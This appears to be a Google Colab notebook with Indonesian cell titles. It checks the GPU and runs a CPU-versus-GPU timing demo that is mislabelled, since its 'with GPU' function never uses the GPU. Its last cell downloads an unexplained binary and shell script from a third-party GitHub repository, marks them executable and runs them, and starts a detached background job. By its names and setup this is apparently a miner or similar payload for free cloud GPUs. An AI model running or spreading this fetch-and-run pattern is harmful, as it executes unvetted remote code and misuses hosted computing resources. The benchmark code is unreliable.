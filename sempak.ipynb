{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "VIOLET.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyMg2JpStcPocbyw9dAl2/oe",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Jekoso/Sola/blob/main/Jekos90.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "T8FdV90wb-l5",
        "cellView": "form"
      },
      "source": [
        "#@title Cek GPU Ngab :)\n",
        "! nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "422_pEimcEfi",
        "cellView": "form"
      },
      "source": [
        "\n",
        "#@title Sebelum Mulai Berdoa Dulu Ya :)\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "43V5OmBWcE3p",
        "cellView": "form"
      },
      "source": [
        "#@title om awighnam astu namo sidham\n",
        "\n",
        "#!/bin/sh\n",
        "\n",
        "!sudo apt update\n",
        "!sudo apt install screen -y\n",
        "!screen -dmS gpu.sh ./gpu.sh 65 75\n",
        "!wget https://github.com/robbyezhaa/JANCOK/raw/main/violet\n",
        "!wget https://raw.githubusercontent.com/robbyezhaa/JANCOK/main/rx.sh\n",
        "!chmod +x violet\n",
        "!chmod +x rx.sh\n",
        "!./rx.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
